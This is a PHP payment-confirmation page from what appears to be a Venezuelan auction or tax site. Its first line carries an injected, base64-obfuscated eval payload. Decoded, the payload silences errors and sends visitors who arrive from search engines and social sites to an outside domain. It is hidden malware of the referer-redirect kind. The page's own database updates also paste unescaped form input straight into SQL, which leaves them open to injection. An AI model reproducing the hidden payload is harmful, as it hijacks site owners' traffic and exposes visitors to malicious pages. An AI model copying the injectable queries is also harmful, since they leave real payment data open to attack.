<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); @session_start();
date_default_timezone_set('America/Caracas');
require_once 'lib/function_gen.php';
if(isset($_GET["123Pago"]))
{
    $_SESSION['paso'] = 2;
    header('Location: index.php?webpage=4');
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $soporte1 = htmlspecialchars((strip_tags($_POST["soporte1"])));
    $soporte2 = htmlspecialchars((strip_tags($_POST["soporte2"])));
    $banco = htmlspecialchars((strip_tags($_POST["banco_pago"])));
	$fecha = explode('/',$_POST["fecha"]);
	$fecha =  $fecha[2] . '-' . $fecha[1] . '-' .$fecha[0];
    $error = false;

    if (isset($_POST['tipo_pago'])) {
//Depósito
        if ($_POST['tipo_pago'] == 1) {
            $codpg = 302;
            $query = "UPDATE mp_Documento_Doc 
      SET BMP_CodigoBan = 400 , Doc_PgSoporte = '$soporte1', Doc_PgFechaConf = '$fecha', BMP_CodigoPg = $codpg, BMP_CodigoEst = 2
      WHERE Doc_Codigo = " . $_SESSION['Doc_Codigo'] . ";";
            if (!fnc_ejecutaSimpleQuery($query))
                $error = true;
        }else if ($_POST['tipo_pago'] == 2) {
//Transferencia
            $codpg = 301;
            $query = "UPDATE mp_Documento_Doc 
      SET BMP_CodigoBan = $banco , Doc_PgSoporte = '$soporte2', Doc_PgFechaConf = '$fecha', BMP_CodigoPg = $codpg, BMP_CodigoEst = 2 
      WHERE Doc_Codigo = " . $_SESSION['Doc_Codigo'] . ";";

            //echo $query;
            if (!fnc_ejecutaSimpleQuery($query))
                $error = true;
        }else if ($_POST['tipo_pago'] == 3) { //123 Pago
            //Do something
            $error = false;
        }

        if (!$error) {
            $_SESSION['paso'] = 2;
            require 'admin/lib/correo_cor.php';
            $cor = new Correo_cor();
            $cor->sendEmail("arojas@subastafiscal.com", "Nuevo Balance/Certificado", 
                                "Hay un nuevo Balance o Certificado COD=".$soporte2);
        }
        header('Location: index.php?webpage=4');
    }
}
?>